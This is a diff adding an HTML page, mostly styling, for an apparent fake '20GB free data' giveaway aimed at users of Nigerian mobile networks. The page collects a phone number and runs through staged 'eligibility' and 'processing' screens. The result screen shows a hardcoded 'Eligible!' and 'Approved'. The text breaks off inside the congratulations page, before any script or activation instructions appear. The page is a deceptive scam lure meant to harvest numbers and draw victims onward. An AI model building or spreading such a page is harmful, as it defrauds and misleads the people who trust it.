@@ -1,0 +1,2083 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Data Wallet · 20GB Giveaway</title>
+    <!-- Font Awesome 6 (free) for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: #f5f7fb;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 36px;
+            box-shadow: 0 20px 40px -10px rgba(0, 20, 30, 0.15);
+            padding: 28px 24px 32px;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+            min-height: 600px;
+        }
+
+        /* ===== PAGE CONTAINERS ===== */
+        .page {
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            opacity: 1;
+            transform: translateX(0);
+        }
+        .page.hidden {
+            display: none;
+            opacity: 0;
+            transform: translateX(20px);
+            pointer-events: none;
+        }
+        .page.active {
+            display: block;
+            animation: fadeInPage 0.5s ease forwards;
+        }
+        @keyframes fadeInPage {
+            0% {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        /* ===== PAGE 1: MAIN ===== */
+        .wallet-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .wallet-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            color: #0b1a2b;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .wallet-header h1 i {
+            color: #2563eb;
+            font-size: 22px;
+        }
+        .badge-giveaway {
+            background: #eef3ff;
+            color: #1e4f8a;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 6px 14px;
+            border-radius: 40px;
+            letter-spacing: 0.2px;
+            border: 1px solid rgba(37, 99, 235, 0.15);
+        }
+        .sub-giveaway {
+            color: #2c3e50;
+            font-size: 15px;
+            font-weight: 450;
+            margin-bottom: 22px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #eef2f6;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .sub-giveaway i {
+            color: #2563eb;
+            font-size: 14px;
+        }
+        .reward-box {
+            background: linear-gradient(145deg, #f0f5ff, #e6edfe);
+            border-radius: 28px;
+            padding: 22px 18px 18px;
+            margin-bottom: 26px;
+            box-shadow: inset 0 1px 4px rgba(255, 255, 255, 0.8), 0 6px 12px rgba(0, 20, 40, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+        .reward-label {
+            font-size: 15px;
+            font-weight: 500;
+            color: #1f3a5f;
+            letter-spacing: 0.3px;
+            margin-bottom: 6px;
+        }
+        .reward-main {
+            display: flex;
+            align-items: baseline;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .reward-main .big-gb {
+            font-size: 46px;
+            font-weight: 700;
+            color: #0b1f3b;
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+        .reward-main .big-gb span {
+            font-weight: 300;
+            color: #2f4b74;
+            font-size: 28px;
+            margin-left: 2px;
+        }
+        .reward-main .free-tag {
+            background: #1e3a6b;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 4px 16px;
+            border-radius: 60px;
+            letter-spacing: 0.3px;
+            margin-left: 8px;
+        }
+        .reward-balance-row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 16px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 60px;
+            padding: 8px 12px 8px 18px;
+            backdrop-filter: blur(2px);
+        }
+        .balance-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #1f3a5f;
+            font-weight: 500;
+            font-size: 15px;
+        }
+        .balance-item i {
+            color: #2563eb;
+            opacity: 0.8;
+        }
+        .balance-highlight {
+            background: #0b1f3b;
+            color: white;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 15px;
+            letter-spacing: 0.2px;
+        }
+
+        .networks-section {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f8faff;
+            padding: 12px 16px;
+            border-radius: 40px;
+            margin: 20px 0 16px;
+            border: 1px solid #e7edf6;
+        }
+        .networks-label {
+            font-weight: 600;
+            color: #1b2b44;
+            font-size: 14px;
+            letter-spacing: 0.2px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .network-logos {
+            display: flex;
+            gap: 18px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .network-logos img {
+            height: 24px;
+            width: auto;
+            display: block;
+            object-fit: contain;
+            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.05));
+            transition: transform 0.1s ease;
+        }
+        .network-logos img:hover {
+            transform: scale(1.03);
+        }
+        .network-logos img[alt="MTN"] {
+            height: 22px;
+        }
+        .network-logos img[alt="airtel"] {
+            height: 22px;
+        }
+        .network-logos img[alt="glo"] {
+            height: 24px;
+        }
+        .network-logos img[alt="etisalat"] {
+            height: 22px;
+        }
+
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #ecfdf5;
+            color: #0b6e4f;
+            padding: 10px 16px;
+            border-radius: 60px;
+            font-weight: 500;
+            font-size: 14px;
+            margin: 12px 0 22px;
+            border: 1px solid #b8e6d2;
+        }
+        .status-badge i {
+            color: #0f9d6b;
+            font-size: 16px;
+        }
+
+        .transfer-title {
+            font-weight: 700;
+            font-size: 18px;
+            color: #0a1e33;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .transfer-title i {
+            color: #2563eb;
+        }
+
+        .phone-input-group {
+            background: #f1f6fd;
+            border-radius: 60px;
+            padding: 6px 6px 6px 22px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #dae3ef;
+            transition: 0.1s ease;
+            margin-bottom: 18px;
+        }
+        .phone-input-group:focus-within {
+            border-color: #2563eb;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
+        }
+        .phone-input-group input {
+            border: none;
+            background: transparent;
+            padding: 14px 0;
+            font-size: 16px;
+            font-weight: 500;
+            color: #0b1f3b;
+            width: 70%;
+            outline: none;
+        }
+        .phone-input-group input::placeholder {
+            color: #7b8ba3;
+            font-weight: 400;
+            font-size: 15px;
+        }
+
+        .check-btn {
+            background: #2563eb;
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-size: 15px;
+            letter-spacing: 0.3px;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            white-space: nowrap;
+            border: 1px solid #1d4ed8;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            min-width: 160px;
+            justify-content: center;
+        }
+        .check-btn:hover:not(:disabled) {
+            background: #1d4ed8;
+            transform: scale(1.01);
+        }
+        .check-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .feature-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 28px;
+            padding-top: 10px;
+            border-top: 1px solid #eaf0f6;
+            flex-wrap: wrap;
+            gap: 8px 0;
+        }
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #1f3a5f;
+            font-weight: 500;
+            font-size: 14px;
+            background: #f8faff;
+            padding: 6px 14px 6px 12px;
+            border-radius: 40px;
+        }
+        .feature-item i {
+            color: #2563eb;
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+        }
+
+        .disclaimer {
+            margin-top: 24px;
+            background: #f2f6fe;
+            padding: 14px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            color: #2b4a6e;
+            text-align: center;
+            font-weight: 450;
+            border: 1px solid #d7e3f5;
+            letter-spacing: 0.2px;
+        }
+        .disclaimer i {
+            margin-right: 6px;
+            color: #4a6f9e;
+        }
+
+        .error-message {
+            color: #b91c1c;
+            background: #fee2e2;
+            padding: 10px 16px;
+            border-radius: 40px;
+            margin-top: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .error-message.show {
+            display: flex;
+        }
+
+        /* ===== PAGE 2: LOADING (initial check) ===== */
+        .loading-page {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .loading-page .spinner-ring {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 24px;
+            border: 6px solid #e6edfe;
+            border-radius: 50%;
+            border-top-color: #2563eb;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .loading-page .loading-icon {
+            font-size: 60px;
+            color: #2563eb;
+            margin-bottom: 24px;
+            animation: pulseGlow 1.2s ease-in-out infinite;
+        }
+        @keyframes pulseGlow {
+            0% {
+                transform: scale(1);
+                opacity: 0.7;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 0.7;
+            }
+        }
+        .loading-page h2 {
+            font-size: 22px;
+            color: #0b1f3b;
+            margin-bottom: 8px;
+        }
+        .loading-page p {
+            color: #4b6a8e;
+            font-size: 15px;
+        }
+        .loading-page .loading-steps {
+            margin-top: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: flex-start;
+            max-width: 280px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .loading-page .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #1f3a5f;
+            font-size: 14px;
+            opacity: 0.4;
+            transition: opacity 0.4s ease;
+        }
+        .loading-page .step.active {
+            opacity: 1;
+            font-weight: 500;
+        }
+        .loading-page .step .step-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #eef2f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            color: #4b6a8e;
+            transition: all 0.3s ease;
+        }
+        .loading-page .step.active .step-icon {
+            background: #2563eb;
+            color: white;
+        }
+        .loading-page .step.done .step-icon {
+            background: #0f9d6b;
+            color: white;
+        }
+
+        /* ===== PAGE 3: RESULT ===== */
+        .result-page {
+            padding: 10px 4px;
+        }
+        .result-page .result-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #ecfdf5;
+            padding: 16px 20px;
+            border-radius: 28px;
+            margin-bottom: 20px;
+            border: 1px solid #b8e6d2;
+        }
+        .result-page .result-header i {
+            font-size: 32px;
+            color: #0f9d6b;
+        }
+        .result-page .result-header h2 {
+            font-size: 20px;
+            color: #0b1f3b;
+        }
+        .result-page .result-header p {
+            color: #2b4a6e;
+            font-size: 14px;
+        }
+        .result-card {
+            background: #f8faff;
+            border-radius: 24px;
+            padding: 20px;
+            border: 1px solid #e7edf6;
+            margin-bottom: 20px;
+        }
+        .result-card .network-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #e6edfe;
+            padding: 8px 20px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 18px;
+            color: #0b1f3b;
+            margin-bottom: 12px;
+        }
+        .result-card .network-badge i {
+            color: #2563eb;
+        }
+        .result-card .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #eef2f6;
+        }
+        .result-card .detail-row:last-child {
+            border-bottom: none;
+        }
+        .result-card .detail-label {
+            color: #4b6a8e;
+            font-size: 14px;
+        }
+        .result-card .detail-value {
+            font-weight: 600;
+            color: #0b1f3b;
+            font-size: 15px;
+        }
+        .result-page .confirm-btn {
+            background: #2563eb;
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 14px 32px;
+            border-radius: 60px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            justify-content: center;
+            border: 1px solid #1d4ed8;
+            margin-top: 8px;
+        }
+        .result-page .confirm-btn:hover:not(:disabled) {
+            background: #1d4ed8;
+        }
+        .result-page .confirm-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* ===== PAGE 4: CONFIRM LOADING ===== */
+        .confirm-loading-page {
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .confirm-loading-page .confetti-icon {
+            font-size: 72px;
+            color: #f9a825;
+            margin-bottom: 20px;
+            animation: bounceConfetti 1s ease-in-out infinite;
+        }
+        @keyframes bounceConfetti {
+            0%,
+            100% {
+                transform: scale(1) rotate(0deg);
+            }
+            50% {
+                transform: scale(1.15) rotate(5deg);
+            }
+        }
+        .confirm-loading-page .spinner-dots {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 24px auto;
+        }
+        .confirm-loading-page .spinner-dots span {
+            width: 14px;
+            height: 14px;
+            background: #2563eb;
+            border-radius: 50%;
+            animation: dotBounce 1.2s ease-in-out infinite;
+        }
+        .confirm-loading-page .spinner-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .confirm-loading-page .spinner-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        @keyframes dotBounce {
+            0%,
+            80%,
+            100% {
+                transform: scale(0.6);
+                opacity: 0.4;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .confirm-loading-page h2 {
+            font-size: 22px;
+            color: #0b1f3b;
+            margin-bottom: 8px;
+        }
+        .confirm-loading-page p {
+            color: #4b6a8e;
+            font-size: 15px;
+        }
+        .confirm-loading-page .progress-bar {
+            width: 100%;
+            max-width: 280px;
+            height: 6px;
+            background: #eef2f6;
+            border-radius: 10px;
+            margin: 24px auto 0;
+            overflow: hidden;
+        }
+        .confirm-loading-page .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #2563eb, #0f9d6b);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+
+        /* ===== PAGE 5: CONGRATULATIONS ===== */
+        .congrats-page {
+            text-align: center;
+            padding: 20px 10px 30px;
+            position: relative;
+            overflow: visible;
+        }
+
+        #celebrationCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+            border-radius: 36px;
+            overflow: hidden;
+        }
+
+        .congrats-content {
+            position: relative;
+            z-index: 20;
+        }
+
+        .congrats-page .trophy {
+            font-size: 64px;
+            color: #f9a825;
+            margin-bottom: 4px;
+            animation: floatTrophy 2s ease-in-out infinite;
+        }
+        @keyframes floatTrophy {
+            0%,
+            100% {
+                transform: translateY(0px) rotate(-2deg);
+            }
+            50% {
+                transform: translateY(-8px) rotate(2deg);
+            }
+        }
+
+        .congrats-page .big-icon {
+            font-size: 80px;
+            color: #0f9d6b;
+            margin-bottom: 8px;
+            animation: pulseGlow 1.5s ease-in-out infinite;
+        }
+
+        .congrats-page h1 {
+            font-size: 32px;
+            font-weight: 800;
+            color: #0b1f3b;
+            margin-bottom: 6px;
+        }
+        .congrats-page .sub-congrats {
+            font-size: 16px;
+            color: #2b4a6e;
+            margin-bottom: 16px;
+        }
+
+        .congrats-page .reward-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #1e3a6b, #2563eb);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 60px;
+            font-size: 28px;
+            font-weight: 700;
+            margin: 8px 0 16px;
+            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
+            animation: badgePop 0.8s ease;
+        }
+        @keyframes badgePop {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            60% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .congrats-page .reward-badge small {
+            font-size: 16px;
+            font-weight: 400;
+            opacity: 0.9;
+        }
+
+        .congrats-page .detail-grid {
+            background: rgba(248, 250, 255, 0.92);
+            backdrop-filter: blur(4px);
+            border-radius: 24px;
+            padding: 20px;
+            border: 1px solid #e7edf6;
+            margin: 16px 0 20px;
+            text-align: left;
+        }
+        .congrats-page .detail-grid .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #eef2f6;
+        }
+        .congrats-page .detail-grid .row:last-child {
+            border-bottom: none;
+        }
+        .congrats-page .detail-grid .label {
+            color: #4b6a8e;
+        }
+        .congrats-page .detail-grid .value {
+            font-weight: 600;
+            color: #0b1f3b;
+        }
+
+        .congrats-page .activate-btn {
+            background: #2563eb;
+            border: none;
+            color: white;
+            font-weight: 700;
+            padding: 16px 32px;
+            border-radius: 60px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            justify-content: center;
+            border: 1px solid #1d4ed8;
+            margin-top: 4px;
+            position: relative;
+            z-index: 30;
+        }
+        .congrats-page .activate-btn:hover {
+            background: #1d4ed8;
+            transform: scale(1.01);
+        }
+
+        /* ===== PAGE 6: ACTIVATION LOADING ===== */
+        .activation-loading-page {
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .activation-loading-page .rocket-icon {
+            font-size: 72px;
+            color: #2563eb;
+            margin-bottom: 20px;
+            animation: rocketLaunch 1.2s ease-in-out infinite;
+        }
+        @keyframes rocketLaunch {
+            0% {
+                transform: translateY(0) rotate(-10deg);
+                opacity: 0.7;
+            }
+            50% {
+                transform: translateY(-20px) rotate(5deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(0) rotate(-10deg);
+                opacity: 0.7;
+            }
+        }
+        .activation-loading-page .pulse-ring {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            border-radius: 50%;
+            background: transparent;
+            border: 4px solid #e6edfe;
+            border-top-color: #2563eb;
+            animation: spin 0.8s linear infinite;
+            position: relative;
+        }
+        .activation-loading-page .pulse-ring::after {
+            content: '';
+            position: absolute;
+            top: -8px;
+            left: -8px;
+            right: -8px;
+            bottom: -8px;
+            border-radius: 50%;
+            border: 3px solid rgba(37, 99, 235, 0.15);
+            animation: pulseRing 1.5s ease-out infinite;
+        }
+        @keyframes pulseRing {
+            0% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+            100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
+        }
+        .activation-loading-page h2 {
+            font-size: 22px;
+            color: #0b1f3b;
+            margin-bottom: 8px;
+        }
+        .activation-loading-page p {
+            color: #4b6a8e;
+            font-size: 15px;
+        }
+        .activation-loading-page .activation-steps {
+            margin-top: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: flex-start;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .activation-loading-page .act-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #1f3a5f;
+            font-size: 14px;
+            opacity: 0.3;
+            transition: opacity 0.5s ease;
+        }
+        .activation-loading-page .act-step.active {
+            opacity: 1;
+            font-weight: 500;
+        }
+        .activation-loading-page .act-step .step-num {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #eef2f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 13px;
+            color: #4b6a8e;
+            transition: all 0.3s ease;
+        }
+        .activation-loading-page .act-step.active .step-num {
+            background: #2563eb;
+            color: white;
+        }
+        .activation-loading-page .act-step.done .step-num {
+            background: #0f9d6b;
+            color: white;
+        }
+
+        /* ===== PAGE 7: ACTIVATION INSTRUCTIONS ===== */
+        .instructions-page {
+            padding: 10px 4px;
+        }
+        .instructions-page .instructions-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #eef3ff;
+            padding: 16px 20px;
+            border-radius: 28px;
+            margin-bottom: 20px;
+            border: 1px solid #c7d9f5;
+        }
+        .instructions-page .instructions-header i {
+            font-size: 32px;
+            color: #2563eb;
+        }
+        .instructions-page .instructions-header h2 {
+            font-size: 20px;
+            color: #0b1f3b;
+        }
+        .instructions-page .instructions-header p {
+            color: #2b4a6e;
+            font-size: 14px;
+        }
+
+        .instructions-card {
+            background: #f8faff;
+            border-radius: 24px;
+            padding: 20px;
+            border: 1px solid #e7edf6;
+            margin-bottom: 20px;
+        }
+        .instructions-card .instruction-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            padding: 12px 0;
+            border-bottom: 1px solid #eef2f6;
+        }
+        .instructions-card .instruction-item:last-child {
+            border-bottom: none;
+        }
+        .instructions-card .instruction-item .num-badge {
+            min-width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #2563eb;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 13px;
+            margin-top: 2px;
+        }
+        .instructions-card .instruction-item .instruction-text {
+            color: #1f3a5f;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .instructions-card .instruction-item .instruction-text strong {
+            color: #0b1f3b;
+        }
+
+        .instructions-page .done-btn {
+            background: #2563eb;
+            border: none;
+            color: white;
+            font-weight: 700;
+            padding: 16px 32px;
+            border-radius: 60px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            justify-content: center;
+            border: 1px solid #1d4ed8;
+            margin-top: 8px;
+        }
+        .instructions-page .done-btn:hover {
+            background: #1d4ed8;
+            transform: scale(1.01);
+        }
+
+        /* Cookie notice */
+        .cookie-notice {
+            font-size: 11px;
+            color: #8a9bb5;
+            text-align: center;
+            margin-top: 12px;
+            padding: 8px;
+            border-top: 1px dashed #e0e8f0;
+        }
+
+        @media (max-width: 420px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .reward-main .big-gb {
+                font-size: 38px;
+            }
+            .phone-input-group {
+                flex-wrap: wrap;
+                background: transparent;
+                padding: 0;
+                border: none;
+                gap: 10px;
+            }
+            .phone-input-group input {
+                width: 100%;
+                background: #f1f6fd;
+                border-radius: 60px;
+                padding: 14px 20px;
+                border: 1px solid #dae3ef;
+            }
+            .check-btn {
+                width: 100%;
+                justify-content: center;
+                display: flex;
+            }
+            .feature-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+            .network-logos {
+                gap: 12px;
+            }
+            .network-logos img {
+                height: 20px !important;
+            }
+            .loading-page .loading-steps {
+                max-width: 100%;
+            }
+            .congrats-page .reward-badge {
+                font-size: 22px;
+                padding: 12px 24px;
+            }
+            .congrats-page .trophy {
+                font-size: 48px;
+            }
+            .congrats-page .big-icon {
+                font-size: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+
+        <!-- ========== PAGE 1: MAIN ========== -->
+        <div id="pageMain" class="page active">
+            <div class="wallet-header">
+                <h1><i class="fas fa-wallet"></i> Data Wallet</h1>
+                <span class="badge-giveaway"><i class="fas fa-gift" style="margin-right: 4px;"></i> 20GB Giveaway</span>
+            </div>
+
+            <div class="sub-giveaway">
+                <i class="fas fa-chevron-circle-right"></i> Check your number and transfer your free data reward.
+            </div>
+
+            <div class="reward-box">
+                <div class="reward-label"><i class="fas fa-database" style="margin-right: 6px;"></i> Available Reward</div>
+                <div class="reward-main">
+                    <span class="big-gb">20GB <span>·</span></span>
+                    <span class="free-tag">Free data balance</span>
+                </div>
+                <div class="reward-balance-row">
+                    <span class="balance-item"><i class="fas fa-check-circle"></i> 20GB</span>
+                    <span class="balance-highlight">20GB</span>
+                    <span class="balance-item"><i class="fas fa-check-circle"></i> Free data balance</span>
+                </div>
+            </div>
+
+            <div class="networks-section">
+                <span class="networks-label"><i class="fas fa-signal" style="margin-right: 6px;"></i> Supported Networks</span>
+                <div class="network-logos">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 30'%3E%3Ctext x='0' y='22' font-family='Arial, sans-serif' font-weight='700' font-size='22' fill='%23f9a825'%3EMTN%3C/text%3E%3C/svg%3E" alt="MTN">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 30'%3E%3Ctext x='0' y='22' font-family='Arial, sans-serif' font-weight='700' font-size='20' fill='%23d81b60'%3Eairtel%3C/text%3E%3C/svg%3E" alt="airtel">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 30'%3E%3Ctext x='0' y='22' font-family='Arial, sans-serif' font-weight='700' font-size='22' fill='%230d6b2b'%3Eglo%3C/text%3E%3C/svg%3E" alt="glo">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 30'%3E%3Ctext x='0' y='22' font-family='Arial, sans-serif' font-weight='700' font-size='18' fill='%230a3e6d'%3Eetisalat%3C/text%3E%3C/svg%3E" alt="etisalat">
+                </div>
+            </div>
+
+            <div class="status-badge">
+                <i class="fas fa-circle-check"></i> Network Status: Data transfer eligibility check is currently available.
+            </div>
+
+            <div class="transfer-title">
+                <i class="fas fa-arrow-right-arrow-left"></i> Transfer Data
+                <span style="font-size: 14px; font-weight: 400; color: #4f6f92; margin-left: auto;">Enter your phone number</span>
+            </div>
+
+            <div class="phone-input-group">
+                <input type="tel" id="phoneInput" placeholder="08012345678">
+                <button class="check-btn" id="checkBtn"><i class="fas fa-check-circle"></i> Check Eligibility</button>
+            </div>
+
+            <div class="error-message" id="errorMsg">
+                <i class="fas fa-exclamation-circle"></i> <span id="errorText">Invalid phone number</span>
+            </div>
+
+            <div class="feature-row">
+                <span class="feature-item"><i class="fas fa-bolt"></i> Instant Check</span>
+                <span class="feature-item"><i class="fas fa-lock"></i> Secure & Safe</span>
+                <span class="feature-item"><i class="fas fa-percent"></i> 100% Free</span>
+            </div>
+            <div style="font-size: 13px; color: #52739a; margin-top: 8px; padding-left: 4px; display: flex; gap: 6px; flex-wrap: wrap;">
+                <span><i class="fas fa-arrow-right" style="font-size: 10px;"></i> Get result instantly</span>
+                <span><i class="fas fa-arrow-right" style="font-size: 10px;"></i> Your data is protected</span>
+                <span><i class="fas fa-arrow-right" style="font-size: 10px;"></i> No hidden charges</span>
+            </div>
+
+            <div class="disclaimer">
+                <i class="fas fa-info-circle"></i> Promo availability may vary by number and network.
+            </div>
+            <div style="margin-top: 12px; font-size: 12px; color: #6c89aa; text-align: right; border-top: 1px dashed #dce5f0; padding-top: 14px; letter-spacing: 0.2px;">
+                <i class="fas fa-shield-alt" style="margin-right: 4px;"></i> Data Wallet · 20GB giveaway
+            </div>
+            <div class="cookie-notice">
+                <i class="fas fa-cookie-bite"></i> Your progress is saved for 24 hours
+            </div>
+        </div>
+
+        <!-- ========== PAGE 2: LOADING (initial check) ========== -->
+        <div id="pageLoading" class="page hidden">
+            <div class="loading-page">
+                <div class="spinner-ring"></div>
+                <div class="loading-icon">
+                    <i class="fas fa-sync-alt fa-spin"></i>
+                </div>
+                <h2>Checking Eligibility</h2>
+                <p>Please wait while we verify your number...</p>
+
+                <div class="loading-steps">
+                    <div class="step" id="step1">
+                        <span class="step-icon"><i class="fas fa-search"></i></span>
+                        <span>Validating phone number</span>
+                    </div>
+                    <div class="step" id="step2">
+                        <span class="step-icon"><i class="fas fa-sim-card"></i></span>
+                        <span>Detecting network provider</span>
+                    </div>
+                    <div class="step" id="step3">
+                        <span class="step-icon"><i class="fas fa-gift"></i></span>
+                        <span>Confirming 20GB eligibility</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 3: RESULT ========== -->
+        <div id="pageResult" class="page hidden">
+            <div class="result-page">
+                <div class="result-header">
+                    <i class="fas fa-check-circle"></i>
+                    <div>
+                        <h2>Eligible!</h2>
+                        <p>Your number qualifies for the 20GB giveaway</p>
+                    </div>
+                </div>
+
+                <div class="result-card">
+                    <div class="network-badge">
+                        <i class="fas fa-sim-card"></i>
+                        <span id="resultNetwork">MTN</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Phone Number</span>
+                        <span class="detail-value" id="resultPhone">08031234567</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Reward</span>
+                        <span class="detail-value">20GB Free Data</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Network</span>
+                        <span class="detail-value" id="resultNetworkLabel">MTN Nigeria</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Status</span>
+                        <span class="detail-value" style="color: #0f9d6b;"><i class="fas fa-check-circle"></i> Approved</span>
+                    </div>
+                </div>
+
+                <button class="confirm-btn" id="confirmBtn"><i class="fas fa-thumbs-up"></i> Confirm & Claim 20GB</button>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 4: CONFIRM LOADING ========== -->
+        <div id="pageConfirmLoading" class="page hidden">
+            <div class="confirm-loading-page">
+                <div class="confetti-icon">
+                    <i class="fas fa-star"></i>
+                </div>
+                <div class="spinner-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                <h2>Processing your claim</h2>
+                <p>Please wait while we activate your 20GB reward...</p>
+                <div class="progress-bar">
+                    <div class="fill" id="progressFill"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 5: CONGRATULATIONS ========== -->
+        <div id="pageCongrats" class="page hidden">
+            <div class="congrats-page">
+                <canvas id="celebrationCanvas"></canvas>
+
+                <div class="congrats-content">
+                    <div class="trophy">
